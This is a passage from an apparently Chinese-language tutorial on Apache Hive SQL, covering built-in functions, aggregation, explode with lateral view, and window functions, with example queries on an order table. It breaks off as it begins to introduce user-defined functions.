</span><br><span class="line"><span class="keyword">from</span> emp </span><br><span class="line">cluster <span class="keyword">by</span> deptno;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">    * </span><br><span class="line"><span class="keyword">from</span> emp </span><br><span class="line"><span class="keyword">distribute</span> <span class="keyword">by</span> deptno </span><br><span class="line"><span class="keyword">sort</span> <span class="keyword">by</span> deptno;</span><br></pre></td></tr></table></figure><h2 id="6、函数">6、函数</h2><h3 id="6-1-简介">6.1 简介</h3><blockquote><p>Hive会将常用的逻辑封装成<strong>函数</strong>给用户进行使用，类似于Java中的函数，文档参考：<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+UDF" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+UDF">https://cwiki.apache.org/confluence/display/Hive/LanguageManual+UDF</a></p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看系统内置函数</span></span><br><span class="line"><span class="keyword">show</span> functions;</span><br><span class="line"><span class="comment"># 查看内置函数用法</span></span><br><span class="line">desc function upper;</span><br><span class="line"><span class="comment"># 查看内置函数详细信息</span></span><br><span class="line">desc function extended upper;</span><br></pre></td></tr></table></figure><h3 id="6-2-单行函数">6.2 单行函数</h3><blockquote><p>单行函数按照功能可分为如下几类: 日期函数、字符串函数、集合函数、数学函数、流程控制函数等</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># =======数值函数</span></span><br><span class="line"><span class="comment"># round：四舍五入</span></span><br><span class="line"><span class="comment"># ceil：向上取整</span></span><br><span class="line"><span class="comment"># floor：向下取整</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">round</span>(<span class="number">3.3</span>);   3</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======字符串函数</span></span><br><span class="line"><span class="comment"># substring：截取字符串,返回字符串A从start位置到结尾的字符串</span></span><br><span class="line">substring(string A, int <span class="keyword">start</span>) </span><br><span class="line"><span class="comment"># substring(string A, int start, int len) ,返回字符串A从start位置开始，长度为len的字符串</span></span><br><span class="line"><span class="comment"># replace ：替换</span></span><br><span class="line"><span class="comment"># replace(string A, string B, string C),将字符串A中的子字符串B替换为C</span></span><br><span class="line"><span class="comment"># regexp_replace：正则替换</span></span><br><span class="line"><span class="comment"># regexp_replace(string A, string B, string C),将字符串A中的符合java正则表达式B的部分替换为C。注意，在有些情况下要使用转义字符</span></span><br><span class="line"><span class="keyword">select</span> regexp_replace(<span class="string">'100-200'</span>, <span class="string">'(\\d+)'</span>, <span class="string">'num'</span>) </span><br><span class="line"><span class="comment"># regexp：正则匹配，若字符串符合正则表达式，则返回true，否则返回false。</span></span><br><span class="line"><span class="keyword">select</span> <span class="string">'dfsaaaa'</span> regexp <span class="string">'dfsa+'</span></span><br><span class="line"><span class="comment"># repeat：重复字符串</span></span><br><span class="line"><span class="comment"># repeat(string A, int n)，将字符串A重复n遍</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">repeat</span>(<span class="string">'123'</span>, <span class="number">3</span>);</span><br><span class="line"><span class="comment"># split ：字符串切割</span></span><br><span class="line"><span class="comment"># split(string str, string pat),按照正则表达式pat匹配到的内容分割str，分割后的字符串，以数组的形式返回</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">split</span>(<span class="string">'a-b-c-d'</span>,<span class="string">'-'</span>);</span><br><span class="line"><span class="comment"># nvl ：替换null值</span></span><br><span class="line"><span class="comment"># nvl(A,B) ,若A的值不为null，则返回A，否则返回B</span></span><br><span class="line"><span class="keyword">select</span> nvl(<span class="literal">null</span>,<span class="number">1</span>); </span><br><span class="line"><span class="comment"># concat ：拼接字符串</span></span><br><span class="line"><span class="comment"># concat(string A, string B, string C, ……) 将A,B,C……等字符拼接为一个字符串</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat</span>(<span class="string">'beijing'</span>,<span class="string">'-'</span>,<span class="string">'shanghai'</span>,<span class="string">'-'</span>,<span class="string">'shenzhen'</span>);</span><br><span class="line"><span class="comment"># concat_ws：以指定分隔符拼接字符串或者字符串数组</span></span><br><span class="line"><span class="comment"># concat_ws(string A, string…| array(string)) 使用分隔符A拼接多个字符串，或者一个数组的所有元素</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">concat_ws</span>(<span class="string">'-'</span>,<span class="string">'beijing'</span>,<span class="string">'shanghai'</span>,<span class="string">'shenzhen'</span>);</span><br><span class="line"><span class="comment"># get_json_object：解析json字符串</span></span><br><span class="line"><span class="comment"># get_json_object(string json_string, string path) 解析json的字符串json_string，返回path指定的内容。如果输入的json字符串无效，那么返回NULL</span></span><br><span class="line"><span class="keyword">select</span> get_json_object(<span class="string">'[&#123;"name":"大海海","sex":"男","age":"25"&#125;,&#123;"name":"小宋宋","sex":"男","age":"47"&#125;]'</span>,<span class="string">'$.[0].name'</span>);</span><br><span class="line"><span class="comment"># 获取json数组里面的数据</span></span><br><span class="line"><span class="keyword">select</span> get_json_object(<span class="string">'[&#123;"name":"大海海","sex":"男","age":"25"&#125;,&#123;"name":"小宋宋","sex":"男","age":"47"&#125;]'</span>,<span class="string">'$.[0]'</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ==日期函数</span></span><br><span class="line"><span class="comment"># unix_timestamp：返回当前或指定时间的时间戳，前面是日期后面是指，日期传进来的具体格式 </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">unix_timestamp</span>(<span class="string">'2022/08/08 08-08-08'</span>,<span class="string">'yyyy/MM/dd HH-mm-ss'</span>); </span><br><span class="line"><span class="comment"># from_unixtime：转化UNIX时间戳（从 1970-01-01 00:00:00 UTC 到指定时间的秒数）到当前时区的时间格式</span></span><br><span class="line"><span class="keyword">select</span> from_unixtime(<span class="number">1659946088</span>);</span><br><span class="line"><span class="comment"># current_date：当前日期</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">current_date</span>;</span><br><span class="line"><span class="comment"># current_timestamp：当前的日期加时间，并且精确的毫秒 </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">current_timestamp</span>;</span><br><span class="line"><span class="comment"># month：获取日期中的月</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">month</span>(<span class="string">'2022-08-08 08:08:08'</span>);</span><br><span class="line"><span class="comment"># day：获取日期中的日</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">day</span>(<span class="string">'2022-08-08 08:08:08'</span>)</span><br><span class="line"><span class="comment"># hour：获取日期中的小时</span></span><br><span class="line"><span class="comment"># datediff：两个日期相差的天数（结束日期减去开始日期的天数）</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">datediff</span>(<span class="string">'2021-08-08'</span>,<span class="string">'2022-10-09'</span>);</span><br><span class="line"><span class="comment"># date_add：日期加天数；date_sub：日期减天数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">date_add</span>(<span class="string">'2022-08-08'</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment"># date_format:将标准日期解析成指定格式字符串</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">date_format</span>(<span class="string">'2022-08-08'</span>,<span class="string">'yyyy年-MM月-dd日'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ========流程控制函数</span></span><br><span class="line"><span class="comment"># case when：条件判断函数</span></span><br><span class="line"><span class="comment"># 语法一：case when a then b [when c then d] * [else e] end </span></span><br><span class="line"><span class="comment"># 说明：如果a为true，则返回b；如果c为true，则返回d；否则返回 e </span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">then</span> <span class="string">'tom'</span> <span class="keyword">when</span> <span class="number">2</span>=<span class="number">2</span> <span class="keyword">then</span> <span class="string">'mary'</span> <span class="keyword">else</span> <span class="string">'tim'</span> <span class="keyword">end</span> <span class="keyword">from</span> tableName; </span><br><span class="line"><span class="comment"># 语法二： case a when b then c [when d then e]* [else f] end</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="number">100</span> <span class="keyword">when</span> <span class="number">50</span> <span class="keyword">then</span> <span class="string">'tom'</span> <span class="keyword">when</span> <span class="number">100</span> <span class="keyword">then</span> <span class="string">'mary'</span> <span class="keyword">else</span> <span class="string">'tim'</span> <span class="keyword">end</span> <span class="keyword">from</span> tableName; </span><br><span class="line"></span><br><span class="line"><span class="comment"># if: 条件判断，类似于Java中三元运算符</span></span><br><span class="line"><span class="comment"># 语法：if（boolean testCondition, T valueTrue, T valueFalseOrNull）</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">if</span>(<span class="number">10</span> &gt; <span class="number">5</span>,<span class="string">'正确'</span>,<span class="string">'错误'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># =========集合函数</span></span><br><span class="line"><span class="comment"># size：集合中元素的个数</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">size</span>(friends) <span class="keyword">from</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="comment"># map：创建map集合</span></span><br><span class="line"><span class="comment"># 语法：map (key1, value1, key2, value2, …)</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">map</span>(<span class="string">'xiaohai'</span>,<span class="number">1</span>,<span class="string">'dahai'</span>,<span class="number">2</span>);</span><br><span class="line"><span class="comment"># map_keys： 返回map中的key</span></span><br><span class="line"><span class="keyword">select</span> map_keys(<span class="keyword">map</span>(<span class="string">'xiaohai'</span>,<span class="number">1</span>,<span class="string">'dahai'</span>,<span class="number">2</span>));</span><br><span class="line"><span class="comment"># map_values: 返回map中的value</span></span><br><span class="line"><span class="keyword">select</span> map_values(<span class="keyword">map</span>(<span class="string">'xiaohai'</span>,<span class="number">1</span>,<span class="string">'dahai'</span>,<span class="number">2</span>));</span><br><span class="line"><span class="comment"># array_contains: 判断array中是否包含某个元素</span></span><br><span class="line"><span class="keyword">select</span> array_contains(<span class="built_in">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>),<span class="string">'a'</span>);</span><br><span class="line"><span class="comment"># sort_array：将array中的元素排序</span></span><br><span class="line"><span class="keyword">select</span> sort_array(<span class="built_in">array</span>(<span class="string">'a'</span>,<span class="string">'d'</span>,<span class="string">'c'</span>));</span><br><span class="line"><span class="comment"># struct声明struct中的各属性</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">struct</span>(<span class="string">'name'</span>,<span class="string">'age'</span>,<span class="string">'weight'</span>);</span><br><span class="line"><span class="comment"># named_struct声明struct的属性和值</span></span><br><span class="line"><span class="keyword">select</span> named_struct(<span class="string">'name'</span>,<span class="string">'xiaosong'</span>,<span class="string">'age'</span>,<span class="number">18</span>,<span class="string">'weight'</span>,<span class="number">80</span>);</span><br></pre></td></tr></table></figure><h3 id="6-3-高级聚合函数">6.3 高级聚合函数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通聚合 count/sum</span></span><br><span class="line"><span class="comment"># collect_list 收集并形成list集合，结果不去重</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">  sex,</span><br><span class="line">  collect_list(job)</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  employee</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> </span><br><span class="line">  sex</span><br><span class="line"></span><br><span class="line"><span class="comment"># collect_list不去重</span></span><br><span class="line"><span class="comment"># collect_set 收集并形成set集合，结果去重</span></span><br><span class="line"><span class="keyword">select</span> </span><br><span class="line">  sex,</span><br><span class="line">  collect_set(job)</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">  employee</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> </span><br><span class="line">  sex</span><br></pre></td></tr></table></figure><h3 id="6-4-炸裂函数">6.4 炸裂函数</h3><blockquote><p>UDTF (Table-GeneratingFunctions)，接收一行数据，输出一行或多行数据</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用语法</span></span><br><span class="line"><span class="keyword">select</span> <span class="keyword">explode</span>(<span class="built_in">array</span>(<span class="string">"a"</span>,<span class="string">"b"</span>,<span class="string">"c"</span>)) <span class="keyword">as</span> item;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">explode</span>(<span class="keyword">map</span>(<span class="string">"a"</span>,<span class="number">1</span>,<span class="string">"b' ',2,"</span>c<span class="string">",3)) as (key,value);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 还会返回索引</span></span><br><span class="line"><span class="string">select posexplode(array("</span>a<span class="string">","</span>b<span class="string">","</span>c<span class="string">")) as (pos,item);</span></span><br><span class="line"><span class="string"># 返回特定的</span></span><br><span class="line"><span class="string">select inline(array(named_struct("</span><span class="keyword">id</span><span class="string">",1, "</span><span class="keyword">name</span><span class="string">", "</span>zs<span class="string">"),named_struct("</span><span class="keyword">id</span><span class="string">",2, "</span><span class="keyword">name</span><span class="string">", "</span><span class="keyword">Is</span><span class="string">"),named_struct("</span><span class="keyword">id</span><span class="string">",3, "</span><span class="keyword">name</span><span class="string">", "</span>ww<span class="string">"))) as (id, name);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># Latera View通常与UDTF配合使用。</span></span><br><span class="line"><span class="string"># Lateral View可以将UDTF应用到源表的每行数据，将每行数据转换为一行或多行，并将源表中每行的输出结果与该行连接起来，形成一个虚拟表。</span></span><br><span class="line"><span class="string"># 把其中一个列表分别输出</span></span><br><span class="line"><span class="string">select id,name,hobbies,hobby from person lateral view explode(hobbies) tmp as hobby;</span></span><br></pre></td></tr></table></figure><p><img src="http://qnypic.shawncoding.top/blog/202401251334391.png" alt></p><h3 id="6-5-窗口函数（开窗函数）">6.5 窗口函数（开窗函数）</h3><blockquote><p>窗口函数，能为每行数据划分—个窗口，然后对窗口范围内的数据进行计算，最后将计算结果返回给该行数据。<a href="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+WindowingAndAnalytics" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/Hive/LanguageManual+WindowingAndAnalytics">https://cwiki.apache.org/confluence/display/Hive/LanguageManual+WindowingAndAnalytics</a></p></blockquote><p>窗口函数的语法中主要包括“窗口”和“函数”两部分。其中“窗口”用于定义计算范围，“函数”用于定义计算逻辑。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> order_id,order_date,amount,函数(amount) <span class="keyword">over</span>(窗口范围) total_amount <span class="keyword">from</span> order_info;</span><br><span class="line"><span class="comment"># 按照功能，常用窗口可划分为如下几类：聚合函数、跨行取值函数、排名函数</span></span><br><span class="line"><span class="comment"># 绝大多数的聚合函数都可以配合窗口使用，例如max(),min(),sum(),count(),avg()等。</span></span><br><span class="line"><span class="comment"># 需要确定order by，因为MP会分成很多小任务</span></span><br></pre></td></tr></table></figure><p>窗口范围的定义分为两种类型，一种是基于行的，一种是基于值的</p><ul><li>基于行示例:要求每行数据的窗口为上一行到当前行</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251334392.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251334393.png" alt></p><ul><li>基于值示例:要求每行数据的窗口为，值位于当前值-1，到当前值(关键词range)</li></ul><p><img src="http://qnypic.shawncoding.top/blog/202401251334394.png" alt></p><p><strong>窗口分区</strong>，定义窗口范围时，可以指定分区字段，每个分区单独划分窗口</p><p><img src="http://qnypic.shawncoding.top/blog/202401251334395.png" alt></p><p>对于窗口缺省函数</p><ul><li>partition by省略不写，表示不分区</li><li>order by 省略不写，表示不排序</li><li>(rows|range) between … and …省略不写，则使用其默认值，默认值如下:若over()中包含order by，则默认值为<code>range between unbounded preceding and current row；</code>若over()中不包含order by，则默认值为<code>rows between unbounded preceding and unbounded following</code></li></ul><p><strong>下面举例其他常用的窗口函数，lead和lag，first_value和last_value，排名函数，注：lag和lead，rank 、dense_rank、row_number函数不支持自定义窗口</strong></p><p><img src="http://qnypic.shawncoding.top/blog/202401251334396.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251334397.png" alt></p><p><img src="http://qnypic.shawncoding.top/blog/202401251334398.png" alt></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 案例实操</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> order_info</span><br><span class="line">(</span><br><span class="line">    order_id     <span class="keyword">string</span>, <span class="comment">--订单id</span></span><br><span class="line">    user_id      <span class="keyword">string</span>, <span class="comment">-- 用户id</span></span><br><span class="line">    user_name    <span class="keyword">string</span>, <span class="comment">-- 用户姓名</span></span><br><span class="line">    order_date   <span class="keyword">string</span>, <span class="comment">-- 下单日期</span></span><br><span class="line">    order_amount <span class="built_in">int</span>     <span class="comment">-- 订单金额</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="keyword">insert</span> overwrite <span class="keyword">table</span> order_info</span><br><span class="line"><span class="keyword">values</span> (<span class="string">'1'</span>, <span class="string">'1001'</span>, <span class="string">'小元'</span>, <span class="string">'2022-01-01'</span>, <span class="string">'10'</span>),</span><br><span class="line">       (<span class="string">'2'</span>, <span class="string">'1002'</span>, <span class="string">'小海'</span>, <span class="string">'2022-01-02'</span>, <span class="string">'15'</span>),</span><br><span class="line">       (<span class="string">'3'</span>, <span class="string">'1001'</span>, <span class="string">'小元'</span>, <span class="string">'2022-02-03'</span>, <span class="string">'23'</span>),</span><br><span class="line">       (<span class="string">'4'</span>, <span class="string">'1002'</span>, <span class="string">'小海'</span>, <span class="string">'2022-01-04'</span>, <span class="string">'29'</span>),</span><br><span class="line">       (<span class="string">'5'</span>, <span class="string">'1001'</span>, <span class="string">'小元'</span>, <span class="string">'2022-01-05'</span>, <span class="string">'46'</span>),</span><br><span class="line">       (<span class="string">'6'</span>, <span class="string">'1001'</span>, <span class="string">'小元'</span>, <span class="string">'2022-04-06'</span>, <span class="string">'42'</span>),</span><br><span class="line">       (<span class="string">'7'</span>, <span class="string">'1002'</span>, <span class="string">'小海'</span>, <span class="string">'2022-01-07'</span>, <span class="string">'50'</span>),</span><br><span class="line">       (<span class="string">'8'</span>, <span class="string">'1001'</span>, <span class="string">'小元'</span>, <span class="string">'2022-01-08'</span>, <span class="string">'50'</span>),</span><br><span class="line">       (<span class="string">'9'</span>, <span class="string">'1003'</span>, <span class="string">'小辉'</span>, <span class="string">'2022-04-08'</span>, <span class="string">'62'</span>),</span><br><span class="line">       (<span class="string">'10'</span>, <span class="string">'1003'</span>, <span class="string">'小辉'</span>, <span class="string">'2022-04-09'</span>, <span class="string">'62'</span>),</span><br><span class="line">       (<span class="string">'11'</span>, <span class="string">'1004'</span>, <span class="string">'小猛'</span>, <span class="string">'2022-05-10'</span>, <span class="string">'12'</span>),</span><br><span class="line">       (<span class="string">'12'</span>, <span class="string">'1003'</span>, <span class="string">'小辉'</span>, <span class="string">'2022-04-11'</span>, <span class="string">'75'</span>),</span><br><span class="line">       (<span class="string">'13'</span>, <span class="string">'1004'</span>, <span class="string">'小猛'</span>, <span class="string">'2022-06-12'</span>, <span class="string">'80'</span>),</span><br><span class="line">       (<span class="string">'14'</span>, <span class="string">'1003'</span>, <span class="string">'小辉'</span>, <span class="string">'2022-04-13'</span>, <span class="string">'94'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计每个用户截至每次下单的累积下单总额</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    order_id,</span><br><span class="line">    user_id,</span><br><span class="line">    user_name,</span><br><span class="line">    order_date,</span><br><span class="line">    order_amount,</span><br><span class="line">    <span class="keyword">sum</span>(order_amount) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> order_date <span class="keyword">rows</span> <span class="keyword">between</span> <span class="keyword">unbounded</span> <span class="keyword">preceding</span> <span class="keyword">and</span> <span class="keyword">current</span> <span class="keyword">row</span>) sum_so_far</span><br><span class="line"><span class="keyword">from</span> order_info;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计每个用户截至每次下单的当月累积下单总额</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    order_id,</span><br><span class="line">    user_id,</span><br><span class="line">    user_name,</span><br><span class="line">    order_date,</span><br><span class="line">    order_amount,</span><br><span class="line">    <span class="keyword">sum</span>(order_amount) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id,<span class="keyword">substring</span>(order_date,<span class="number">1</span>,<span class="number">7</span>) <span class="keyword">order</span> <span class="keyword">by</span> order_date <span class="keyword">rows</span> <span class="keyword">between</span> <span class="keyword">unbounded</span> <span class="keyword">preceding</span> <span class="keyword">and</span> <span class="keyword">current</span> <span class="keyword">row</span>) sum_so_far</span><br><span class="line"><span class="keyword">from</span> order_info;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 统计每个用户每次下单距离上次下单相隔的天数（首次下单按0天算）</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    order_id,</span><br><span class="line">    user_id,</span><br><span class="line">    user_name,</span><br><span class="line">    order_date,</span><br><span class="line">    order_amount,</span><br><span class="line">    nvl(<span class="keyword">datediff</span>(order_date,last_order_date),<span class="number">0</span>) diff</span><br><span class="line"><span class="keyword">from</span></span><br><span class="line">(</span><br><span class="line">    <span class="keyword">select</span></span><br><span class="line">        order_id,</span><br><span class="line">        user_id,</span><br><span class="line">        user_name,</span><br><span class="line">        order_date,</span><br><span class="line">        order_amount,</span><br><span class="line">        lag(order_date,<span class="number">1</span>,<span class="literal">null</span>) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> order_date) last_order_date</span><br><span class="line">    <span class="keyword">from</span> order_info</span><br><span class="line">)t1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询所有下单记录以及每个用户的每个下单记录所在月份的首/末次下单日期</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    order_id,</span><br><span class="line">    user_id,</span><br><span class="line">    user_name,</span><br><span class="line">    order_date,</span><br><span class="line">    order_amount,</span><br><span class="line">    <span class="keyword">first_value</span>(order_date) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id,<span class="keyword">substring</span>(order_date,<span class="number">1</span>,<span class="number">7</span>) <span class="keyword">order</span> <span class="keyword">by</span> order_date) first_date,</span><br><span class="line">    <span class="keyword">last_value</span>(order_date) <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id,<span class="keyword">substring</span>(order_date,<span class="number">1</span>,<span class="number">7</span>) <span class="keyword">order</span> <span class="keyword">by</span> order_date <span class="keyword">rows</span> <span class="keyword">between</span> <span class="keyword">unbounded</span> <span class="keyword">preceding</span> <span class="keyword">and</span> <span class="keyword">unbounded</span> <span class="keyword">following</span>) last_date</span><br><span class="line"><span class="keyword">from</span> order_info;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 为每个用户的所有下单记录按照订单金额进行排名</span></span><br><span class="line"><span class="keyword">select</span></span><br><span class="line">    order_id,</span><br><span class="line">    user_id,</span><br><span class="line">    user_name,</span><br><span class="line">    order_date,</span><br><span class="line">    order_amount,</span><br><span class="line">    <span class="keyword">rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> order_amount <span class="keyword">desc</span>) rk,</span><br><span class="line">    <span class="keyword">dense_rank</span>() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> order_amount <span class="keyword">desc</span>) drk,</span><br><span class="line">    row_number() <span class="keyword">over</span>(<span class="keyword">partition</span> <span class="keyword">by</span> user_id <span class="keyword">order</span> <span class="keyword">by</span> order_amount <span class="keyword">desc</span>) rn</span><br><span class="line"><span class="keyword">from</span> order_info;</span><br></pre></td></tr></table></figure><h2 id="7、自定义函数">7、自定义函数</h2><h3 id="7-1-介绍">7.1 介绍</h3><blockquote><p>官网文档地址：<a href="https://cwiki.apache.org/confluence/display/Hive/HivePlugins" target="_blank" rel="noopener" title="https://cwiki.apache.org/confluence/display/Hive/HivePlugins">https://cwiki.apache.org/confluence/display/Hive/HivePlugins</a></p></blockquote><p>Hive自带了一些函数，比如：max/min等，但是数量有限，自己可以通过自定义UDF来方便的扩展，当Hive提供的内置函数无法满足你的业务处理需要时，此时就可以考虑使用用户自定义函数（UDF：user-defined 